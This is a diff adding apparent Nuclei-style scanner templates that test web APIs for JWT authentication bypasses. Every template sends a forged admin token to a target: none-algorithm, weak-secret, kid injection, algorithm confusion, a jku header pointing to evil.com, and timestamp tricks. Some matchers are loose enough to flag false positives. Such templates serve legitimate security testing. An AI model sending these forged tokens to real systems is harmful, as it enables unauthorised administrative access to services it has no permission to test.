@@ -1,0 +1,149 @@
+id: jwt-none-alg
+info:
+  name: JWT None Algorithm
+  author: AniipID
+  severity: critical
+  description: Tests for JWT none algorithm signature bypass
+  tags: jwt,auth,bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/admin"
+      - "{{BaseURL}}/api/admin"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0."
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "Welcome"
+          - "Dashboard"
+          - "200 OK"
+        condition: or
+        part: header
+        name: "jwt-none-alg-accepted"
+---
+id: jwt-weak-secret
+info:
+  name: JWT Weak HMAC Secret
+  author: AniipID
+  severity: high
+  description: Tests for JWTs signed with weak/common HMAC secrets
+  tags: jwt,auth,weak-secret
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/admin"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.4fGVAj7l7WLd5m0-fQ1NEpB_TK4Dn6sx8aNnC4B1Jwg"
+    matchers:
+      - type: word
+        words:
+          - "admin"
+          - "200 OK"
+        condition: or
+        part: header
+        name: "jwt-hs256-accepted"
+---
+id: jwt-kid-injection
+info:
+  name: JWT Kid Header Injection
+  author: AniipID
+  severity: critical
+  description: Tests for JWT key ID (kid) header injection vulnerabilities
+  tags: jwt,kid,injection
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/auth"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.bRFz5bOZTBEJV9mXRp_kMhk8t-PMhaDcJqwlXcUSa1s"
+    matchers:
+      - type: word
+        words:
+          - "200 OK"
+        part: header
+        name: "jwt-kid-byte-array"
+---
+id: jwt-alg-confusion
+info:
+  name: JWT Algorithm Confusion
+  author: AniipID
+  severity: critical
+  description: Tests for JWT algorithm confusion (RS256 public key as HS256 secret)
+  tags: jwt,alg,confusion
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.XdXxJbHgVnqI0qXXjnLg6vBUhOB7EjsRR5SCes_vMBc"
+    matchers:
+      - type: word
+        words:
+          - "200 OK"
+        part: header
+        name: "jwt-alg-confusion"
+---
+id: jwt-jku-injection
+info:
+  name: JWT JKU Header Injection
+  author: AniipID
+  severity: critical
+  description: Tests for JWT jku (JWK Set URL) header injection
+  tags: jwt,jku,injection
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImpraSI6Imh0dHBzOi8vZXZpbC5jb20vbXlqd2suanNvbiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJhZG1pbiI6dHJ1ZX0.IXwVzJRu7iwCFmMqNOh6omX_zv2bmVusQSAgKEAeZgU"
+    matchers:
+      - type: word
+        words:
+          - "200 OK"
+        part: header
+        name: "jwt-jku-injection"
+---
+id: jwt-iat-future
+info:
+  name: JWT Future iat Bypass
+  author: AniipID
+  severity: medium
+  description: Tests if JWT with future issued-at timestamp is accepted
+  tags: jwt,iat,timestamp
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0Ijo5OTk5OTk5OTk5LCJhZG1pbiI6dHJ1ZX0.nRbuU7hsLCyYHokl9G87kPJF4s3GMFB5mC-WB04bhQQ"
+    matchers:
+      - type: word
+        words:
+          - "200 OK"
+        part: header
+        name: "jwt-future-iat"
+---
+id: jwt-exp-bypass
+info:
+  name: JWT Expiration Bypass
+  author: AniipID
+  severity: high
+  description: Tests if JWT with expired timestamp is still accepted
+  tags: jwt,exp,bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/user"
+    headers:
+      Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjF9.-AM3Xyrpwe42MOzBKsBJx6R1K2eG48Yj3THcrpP9fBY"
+    matchers:
+      - type: word
+        words:
+          - "200 OK"
+        part: header
+        name: "jwt-exp-bypass"
